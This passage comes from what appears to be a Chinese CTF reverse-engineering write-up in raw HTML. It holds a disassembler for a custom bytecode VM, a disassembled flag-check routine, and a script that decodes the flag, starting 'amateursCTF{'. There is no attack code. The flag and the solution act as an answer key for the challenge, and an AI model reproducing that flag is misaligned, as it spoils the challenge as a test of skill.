b2\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">9</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> += r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">12</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> -= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">13</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> -= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">16</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> *= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">17</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> *= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">20</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> /= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">21</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> /= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">24</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> mod= <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">25</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> mod= r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">28</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    shl r<span class="subst">&#123;b1&#125;</span>, <span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">29</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    shl r<span class="subst">&#123;b1&#125;</span>, r<span class="subst">&#123;b2&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">31</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    read r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">32</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    rdpush\n&quot;</span>)<span class="comment">#i2为栈顶指针</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">33</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    print_write r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)<span class="comment">#只打印不改变栈</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">34</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    print_pop\n&quot;</span>)<span class="comment">#打印加出栈</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">41</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b2&#125;</span> if !r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)<span class="comment">#这里jmp通过修改i来跳转</span></span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">42</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b2&#125;</span> if r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">43</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    jmp <span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">52</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    push r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">53</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    pop r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">54</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    push <span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> b0 == <span class="number">127</span>:</span><br><span class="line">        fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    quit\n&quot;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code):<span class="comment">#这是一个解密函数</span></span><br><span class="line">            code[i] = b0 ^ b1 ^ b2</span><br><span class="line">            code[i + <span class="number">1</span>] = b1</span><br><span class="line">            code[i + <span class="number">2</span>] = b0</span><br></pre></td></tr></table></figure><p>根据code.jvm生成正确的代码，然后人脑模拟运行得到flag</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">0 </span>   push <span class="number">32</span></span><br><span class="line"><span class="symbol">2 </span>   push <span class="number">62</span></span><br><span class="line"><span class="symbol">4 </span>   print_pop</span><br><span class="line"><span class="symbol">5 </span>   print_pop</span><br><span class="line"><span class="symbol">6 </span>   r0 += b2</span><br><span class="line"><span class="symbol">9 </span>   r0 += r0</span><br><span class="line"><span class="symbol">12 </span>   r0 += r0</span><br><span class="line"><span class="symbol">15 </span>   r0 += b2</span><br><span class="line"><span class="symbol">18 </span>   rdpush</span><br><span class="line"><span class="symbol">19 </span>   r0 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">22 </span>   jmp <span class="number">18</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">25 </span>   jmp <span class="number">44</span></span><br><span class="line"><span class="symbol">27 </span>   push <span class="number">83</span></span><br><span class="line"><span class="symbol">29 </span>   push <span class="number">69</span></span><br><span class="line"><span class="symbol">31 </span>   push <span class="number">89</span></span><br><span class="line"><span class="symbol">33 </span>   print_pop</span><br><span class="line"><span class="symbol">34 </span>   print_pop</span><br><span class="line"><span class="symbol">35 </span>   print_pop</span><br><span class="line"><span class="symbol">36 </span>   quit</span><br><span class="line"><span class="symbol">37 </span>   push <span class="number">79</span></span><br><span class="line"><span class="symbol">39 </span>   push <span class="number">78</span></span><br><span class="line"><span class="symbol">41 </span>   print_pop</span><br><span class="line"><span class="symbol">42 </span>   print_pop</span><br><span class="line"><span class="symbol">43 </span>   quit</span><br><span class="line"><span class="symbol">44 </span>   pop r0</span><br><span class="line"><span class="symbol">46 </span>   r0 -= <span class="number">125</span></span><br><span class="line"><span class="symbol">49 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">52 </span>   pop r0</span><br><span class="line"><span class="symbol">54 </span>   r0 -= <span class="number">9</span></span><br><span class="line"><span class="symbol">57 </span>   r0 -= <span class="number">54</span></span><br><span class="line"><span class="symbol">60 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">63 </span>   pop r2</span><br><span class="line"><span class="symbol">65 </span>   r2 -= <span class="number">10</span></span><br><span class="line"><span class="symbol">68 </span>   r2 -= <span class="number">99</span></span><br><span class="line"><span class="symbol">71 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">74 </span>   pop r2</span><br><span class="line"><span class="symbol">76 </span>   r2 -= <span class="number">21</span></span><br><span class="line"><span class="symbol">79 </span>   r2 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">82 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">85 </span>   pop r0</span><br><span class="line"><span class="symbol">87 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">90 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">93 </span>   pop r0</span><br><span class="line"><span class="symbol">95 </span>   r1 += b2</span><br><span class="line"><span class="symbol">98 </span>   <span class="keyword">swap</span> r0 r1</span><br><span class="line"><span class="symbol">100 </span>   r1 += r1</span><br><span class="line"><span class="symbol">103 </span>   r2 += b2</span><br><span class="line"><span class="symbol">106 </span>   r0 += r0</span><br><span class="line"><span class="symbol">109 </span>   r2 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">112 </span>   jmp <span class="number">106</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">115 </span>   r0 += b2</span><br><span class="line"><span class="symbol">118 </span>   r0 -= r1</span><br><span class="line"><span class="symbol">121 </span>   r1 -= r1</span><br><span class="line"><span class="symbol">124 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">127 </span>   pop r0</span><br><span class="line"><span class="symbol">129 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">132 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">135 </span>   pop r1</span><br><span class="line"><span class="symbol">137 </span>   r1 -= <span class="number">1</span></span><br><span class="line"><span class="symbol">140 </span>   r1 -= <span class="number">115</span></span><br><span class="line"><span class="symbol">143 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">146 </span>   pop r2</span><br><span class="line"><span class="symbol">148 </span>   r2 -= <span class="number">3</span></span><br><span class="line"><span class="symbol">151 </span>   r2 -= <span class="number">107</span></span><br><span class="line"><span class="symbol">154 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">157 </span>   pop r1</span><br><span class="line"><span class="symbol">159 </span>   r1 -= <span class="number">3</span></span><br><span class="line"><span class="symbol">162 </span>   r1 -= <span class="number">112</span></span><br><span class="line"><span class="symbol">165 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">168 </span>   pop r0</span><br><span class="line"><span class="symbol">170 </span>   r0 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">173 </span>   r0 -= <span class="number">98</span></span><br><span class="line"><span class="symbol">176 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">179 </span>   pop r0</span><br><span class="line"><span class="symbol">181 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">184 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">187 </span>   pop r0</span><br><span class="line"><span class="symbol">189 </span>   r0 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">192 </span>   r0 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">195 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">198 </span>   pop r3</span><br><span class="line"><span class="symbol">200 </span>   r3 -= <span class="number">11</span></span><br><span class="line"><span class="symbol">203 </span>   r3 -= <span class="number">107</span></span><br><span class="line"><span class="symbol">206 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">209 </span>   pop r3</span><br><span class="line"><span class="symbol">211 </span>   r3 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">214 </span>   r3 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">217 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">220 </span>   pop r1</span><br><span class="line"><span class="symbol">222 </span>   r1 -= <span class="number">19</span></span><br><span class="line"><span class="symbol">225 </span>   r1 -= <span class="number">87</span></span><br><span class="line"><span class="symbol">228 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">231 </span>   pop r0</span><br><span class="line"><span class="symbol">233 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">236 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">239 </span>   pop r2</span><br><span class="line"><span class="symbol">241 </span>   r2 -= <span class="number">26</span></span><br><span class="line"><span class="symbol">244 </span>   r2 -= <span class="number">84</span></span><br><span class="line"><span class="symbol">247 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">250 </span>   pop r2</span><br><span class="line"><span class="symbol">252 </span>   r2 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">255 </span>   r2 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">258 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">261 </span>   pop r1</span><br><span class="line"><span class="symbol">263 </span>   r1 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">266 </span>   r1 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">269 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">272 </span>   pop r1</span><br><span class="line"><span class="symbol">274 </span>   r1 -= <span class="number">15</span></span><br><span class="line"><span class="symbol">277 </span>   r1 -= <span class="number">94</span></span><br><span class="line"><span class="symbol">280 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">283 </span>   pop r0</span><br><span class="line"><span class="symbol">285 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">288 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">291 </span>   pop r1</span><br><span class="line"><span class="symbol">293 </span>   r1 -= <span class="number">41</span></span><br><span class="line"><span class="symbol">296 </span>   r1 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">299 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">302 </span>   pop r2</span><br><span class="line"><span class="symbol">304 </span>   r2 -= <span class="number">39</span></span><br><span class="line"><span class="symbol">307 </span>   r2 -= <span class="number">72</span></span><br><span class="line"><span class="symbol">310 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">313 </span>   pop r2</span><br><span class="line"><span class="symbol">315 </span>   r2 -= <span class="number">45</span></span><br><span class="line"><span class="symbol">318 </span>   r2 -= <span class="number">76</span></span><br><span class="line"><span class="symbol">321 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">324 </span>   pop r0</span><br><span class="line"><span class="symbol">326 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">329 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">332 </span>   pop r0</span><br><span class="line"><span class="symbol">334 </span>   r0 -= <span class="number">7</span></span><br><span class="line"><span class="symbol">337 </span>   r0 -= <span class="number">41</span></span><br><span class="line"><span class="symbol">340 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">343 </span>   pop r1</span><br><span class="line"><span class="symbol">345 </span>   r1 -= <span class="number">35</span></span><br><span class="line"><span class="symbol">348 </span>   r1 -= <span class="number">65</span></span><br><span class="line"><span class="symbol">351 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r1</span><br><span class="line"><span class="symbol">354 </span>   pop r0</span><br><span class="line"><span class="symbol">356 </span>   r0 -= <span class="number">95</span></span><br><span class="line"><span class="symbol">359 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">362 </span>   pop r2</span><br><span class="line"><span class="symbol">364 </span>   r2 -= <span class="number">44</span></span><br><span class="line"><span class="symbol">367 </span>   r2 -= <span class="number">72</span></span><br><span class="line"><span class="symbol">370 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r2</span><br><span class="line"><span class="symbol">373 </span>   pop r3</span><br><span class="line"><span class="symbol">375 </span>   r3 -= <span class="number">4</span></span><br><span class="line"><span class="symbol">378 </span>   r3 -= <span class="number">48</span></span><br><span class="line"><span class="symbol">381 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">384 </span>   pop r3</span><br><span class="line"><span class="symbol">386 </span>   r3 -= <span class="number">0</span></span><br><span class="line"><span class="symbol">389 </span>   r3 -= <span class="number">104</span></span><br><span class="line"><span class="symbol">392 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r3</span><br><span class="line"><span class="symbol">395 </span>   pop r0</span><br><span class="line"><span class="symbol">397 </span>   r0 -= <span class="number">28</span></span><br><span class="line"><span class="symbol">400 </span>   r0 -= <span class="number">91</span></span><br><span class="line"><span class="symbol">403 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">406 </span>   pop r0</span><br><span class="line"><span class="symbol">408 </span>   r0 -= <span class="number">123</span></span><br><span class="line"><span class="symbol">411 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">414 </span>   pop r0</span><br><span class="line"><span class="symbol">416 </span>   r0 -= <span class="number">70</span></span><br><span class="line"><span class="symbol">419 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">422 </span>   pop r0</span><br><span class="line"><span class="symbol">424 </span>   r0 -= <span class="number">84</span></span><br><span class="line"><span class="symbol">427 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">430 </span>   pop r0</span><br><span class="line"><span class="symbol">432 </span>   r0 -= <span class="number">67</span></span><br><span class="line"><span class="symbol">435 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">438 </span>   pop r0</span><br><span class="line"><span class="symbol">440 </span>   r0 -= <span class="number">115</span></span><br><span class="line"><span class="symbol">443 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">446 </span>   pop r0</span><br><span class="line"><span class="symbol">448 </span>   r0 -= <span class="number">114</span></span><br><span class="line"><span class="symbol">451 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">454 </span>   pop r0</span><br><span class="line"><span class="symbol">456 </span>   r0 -= <span class="number">117</span></span><br><span class="line"><span class="symbol">459 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">462 </span>   pop r0</span><br><span class="line"><span class="symbol">464 </span>   r0 -= <span class="number">101</span></span><br><span class="line"><span class="symbol">467 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">470 </span>   pop r0</span><br><span class="line"><span class="symbol">472 </span>   r0 -= <span class="number">116</span></span><br><span class="line"><span class="symbol">475 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">478 </span>   pop r0</span><br><span class="line"><span class="symbol">480 </span>   r0 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">483 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">486 </span>   pop r0</span><br><span class="line"><span class="symbol">488 </span>   r0 -= <span class="number">109</span></span><br><span class="line"><span class="symbol">491 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">494 </span>   pop r0</span><br><span class="line"><span class="symbol">496 </span>   r0 -= <span class="number">97</span></span><br><span class="line"><span class="symbol">499 </span>   jmp <span class="number">37</span> <span class="keyword">if</span> r0</span><br><span class="line"><span class="symbol">502 </span>   jmp <span class="number">27</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">q</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end =<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#对应每一个循环条件</span></span><br><span class="line"></span><br><span class="line">q(<span class="number">97</span>)</span><br><span class="line">q(<span class="number">109</span>)</span><br><span class="line">q(<span class="number">97</span>)</span><br><span class="line">q(<span class="number">116</span>)</span><br><span class="line">q(<span class="number">101</span>)</span><br><span class="line">q(<span class="number">117</span>)</span><br><span class="line">q(<span class="number">114</span>)</span><br><span class="line">q(<span class="number">115</span>)</span><br><span class="line">q(<span class="number">67</span>)</span><br><span class="line">q(<span class="number">84</span>)</span><br><span class="line">q(<span class="number">70</span>)</span><br><span class="line">q(<span class="number">123</span>)</span><br><span class="line">q(<span class="number">28</span>+<span class="number">91</span>)</span><br><span class="line">q(<span class="number">104</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">44</span>+<span class="number">72</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">35</span>+<span class="number">65</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">41</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">45</span>+<span class="number">76</span>)</span><br><span class="line">q(<span class="number">39</span>+<span class="number">72</span>)</span><br><span class="line">q(<span class="number">41</span>+<span class="number">44</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">15</span>+<span class="number">94</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">44</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">26</span>+<span class="number">84</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">19</span>+<span class="number">87</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">11</span>+<span class="number">107</span>)</span><br><span class="line">q(<span class="number">4</span>+<span class="number">48</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span class="number">7</span>+<span class="number">98</span>)</span><br><span class="line">q(<span class="number">115</span>)</span><br><span class="line">q(<span class="number">110</span>)</span><br><span class="line">q(<span class="number">116</span>)</span><br><span class="line">q(<span class="number">95</span>)</span><br><span class="line">q(<span 